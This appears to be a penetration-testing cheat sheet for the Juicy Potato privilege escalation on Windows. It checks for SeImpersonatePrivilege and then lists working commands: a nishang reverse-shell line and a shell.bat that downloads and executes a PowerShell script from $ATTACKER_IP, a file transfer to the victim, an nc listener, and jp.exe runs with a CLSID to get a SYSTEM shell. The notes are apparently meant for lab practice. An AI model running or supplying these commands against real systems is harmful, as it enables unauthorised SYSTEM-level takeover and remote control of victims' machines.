# <span style="color:#FF5555">Juicy potato attack</span>

> [!info] Variables used below
> - `$ATTACKER_IP` – your attacking machine's IP

## <span style="color:#8BE9FD">Methodology</span>

This privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\SYSTEM. 

## <span style="color:#8BE9FD">Detection</span>


### <span style="color:#50FA7B">Windows VM</span>

1. We should have `SeImpersonatePrivilege` privileges enabled
```console
C:\Temp>whoami /priv
```
![image](https://user-images.githubusercontent.com/59029171/161144004-97322646-a231-4fef-afd8-239570f44f8c.png)

## <span style="color:#8BE9FD">Exploitation</span>

### <span style="color:#50FA7B">Kali VM</span>
1. Copy `Invoke-PowerShellTcp.ps1` from [nishang](https://github.com/samratashok/nishang/tree/master/Shells) shells as `shell.ps1`
2. Add the line at the bottom of `shell.ps1`
```console
Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port 9999
```

3. Lets create a `shell.bat` file
```console
powershell -c iex(new-object net.webclient).downloadstring('http://$ATTACKER_IP/shell.ps1')
```

4. Transfer `shell.bat` and `juicypotato.exe` on victim machine
```console
$ (new-object net.webclient).downloadfile('http://$ATTACKER_IP/file', 'C:\temp\file')
```

5. Set a listener on port 9999
```console
$ sudo rlwrap nc -lnvp 9999
```

### <span style="color:#50FA7B">Windows VM</span>

1. Run juicy potato
```console
$ ./jp.exe -p shell.bat -l 7777 -t *
```
+ If this fail
+ Try with a different CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\SYSTEM
+ Link --> [http://ohpe.it/juicy-potato/CLSID](http://ohpe.it/juicy-potato/CLSID)

2. Lets run again
```console
$ ./jp.exe -p shell.bat -l 7777 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

### <span style="color:#50FA7B">Kali VM</span>

1. Wait for a reverse shell on your kali machine.

